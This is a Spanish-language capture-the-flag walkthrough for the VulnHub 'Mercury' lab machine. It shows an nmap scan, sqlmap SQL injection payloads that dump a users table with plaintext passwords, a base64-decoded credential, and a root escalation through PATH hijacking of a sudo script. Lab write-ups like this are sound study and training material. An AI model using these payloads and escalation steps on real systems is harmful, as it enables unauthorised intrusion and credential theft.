https://www.vulnhub.com/entry/the-planets-mercury,544/

# Mercury

## Datos

IP Atacante: 192.168.0.25
IP Victima: 192.168.0.31

## Recon

### Nmap

```
datadiego@~ nmap -Pn 192.168.0.31
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 10:50 CET
Nmap scan report for 192.168.0.31
Host is up (0.0013s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

## Web

En la maquina hay un servidor http, en el index solo hay un mensaje en plano:

```
Hello. This site is currently in development please check back later.
```

Existe un robots.txt:

```
User-agent: * 
Disallow: /
```

Si intentamos entrar a cualquier otra pagina que no existe:

```

Page not found (404)
Request Method: 	GET
Request URL: 	http://192.168.0.31:8080/hello

Using the URLconf defined in mercury_proj.urls, Django tried these URL patterns, in this order:

    [name='index']
    robots.txt [name='robots']
    mercuryfacts/

The current path, hello, didn't match any of these.

You're seeing this error because you have DEBUG = True in your Django settings file. Change that to False, and Django will display a standard 404 page.
```

Ahora sabemos que el servidor es un django, y que existe un endpoint `mercuryfacts`.

Cuando accedemos a /mercuryfacts encontramos otros dos endpoints:

- /mercuryfacts/todo
- /mercuryfacts/:number

En la lista de /todo:
```
 Still todo:

    Add CSS.
    Implement authentication (using users table)
    Use models in django instead of direct mysql call
    All the other stuff, so much!!!
```

Lanzamos sqlmap:

```
sqlmap -u http://192.168.0.31:8080/mercuryfacts/ --dbs --batch
```

Encuentra lo siguiente:

```
sqlmap identified the following injection point(s) with a total of 1876 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: error-based
    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
    Payload: http://192.168.0.31:8080/mercuryfacts/GTID_SUBSET(CONCAT(0x7170706b71,(SELECT (ELT(7619=7619,1))),0x7170707a71),7619)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: http://192.168.0.31:8080/mercuryfacts/(CASE WHEN (5772=5772) THEN SLEEP(5) ELSE 5772 END)

    Type: UNION query
    Title: MySQL UNION query (random number) - 1 column
    Payload: http://192.168.0.31:8080/mercuryfacts/-9431 UNION ALL SELECT CONCAT(0x7170706b71,0x746152665350437975484f575550785542644a64465743704a555253535467456c67735377476378,0x7170707a71)#
---
[05:11:02] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[05:11:02] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] mercury

[05:11:02] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.0.31'

[*] ending @ 05:11:02 /2025-02-11/
```

Sacamos datos de las tablas con:

```
sqlmap -u http://192.168.0.31:8080/mercuryfacts/ --current-db -D mercury --batch --dump-all
```

Encontramos lo siguiente:

```
[05:50:50] [INFO] fetching entries for table 'users' in database 'mercury'
Database: mercury
Table: users
[4 entries]
+----+-------------------------------+-----------+
| id | password                      | username  |
+----+-------------------------------+-----------+
| 1  | johnny1987                    | john      |
| 2  | lovemykids111                 | laura     |
| 3  | lovemybeer111                 | sam       |
| 4  | mercuryisthesizeof0.056Earths | webmaster |
+----+-------------------------------+-----------+
```

Ningun usuario funciona en SSH excepto `webmaster`

Encontramos la user_flag.txt:

```
user_flag_8339915c9a454657bd60ee58776f4ccd
```

En `/etc/passwd` encontramos otro usuario:
linuxmaster:x:1002:1002:,,,:/home/linuxmaster:/bin/bash

Encontramos el hash de ambos:

```
webmaster@mercury:~$ cat mercury_proj/notes.txt 
Project accounts (both restricted):
webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
```

Descodificamos la contraseña:

```
webmaster@mercury:~/mercury_proj/mercury_proj$ echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" | base64 -d
mercurymeandiameteris4880km
```

Entramos por SSH o mediante `su linuxmaster` y comprobamos permisos con sudo -l:

```
linuxmaster@mercury:~$ sudo -l
[sudo] password for linuxmaster: 
Matching Defaults entries for linuxmaster on mercury:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User linuxmaster may run the following commands on mercury:
    (root : root) SETENV: /usr/bin/check_syslog.sh
```

Comprobamos el archivo:

```
linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh 
#!/bin/bash
tail -n 10 /var/log/syslog
```

El comando se esta ejecutando directamente, sin especificar la ruta absoluta, por lo que es vulnerable a `path hijacking`.

Podemos hacer lo siguiente:

```
linuxmaster@mercury:~$ mkdir /tmp/malito
```

Dentro del directorio, creamos un `.sh` que ejecute una shell con nano:

```
#!/bin/bash
/bin/bash
```

Damos permisos con `chmod +x /tmp/malito/tail`.
Exportamos la variable con `export PATH=/tmp/malito:$PATH`
Ejecutamos el script utilizando la variable de entorno con `sudo --preserve-env=PATH /usr/bin/check_syslog.sh`

Obtenemos acceso a root!

```
linuxmaster@mercury:~$ cd /tmp/malito/
linuxmaster@mercury:/tmp/malito$ ls
linuxmaster@mercury:/tmp/malito$ nano tail
linuxmaster@mercury:/tmp/malito$ ls
tail
linuxmaster@mercury:/tmp/malito$ chmod +x /tmp/malito/tail 
linuxmaster@mercury:/tmp/malito$ export PATH=/tmp/malito:$PATH
linuxmaster@mercury:/tmp/malito$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh 
[sudo] password for linuxmaster: 
root@mercury:/tmp/malito# whoami
root
root@mercury:/tmp/malito# 
```
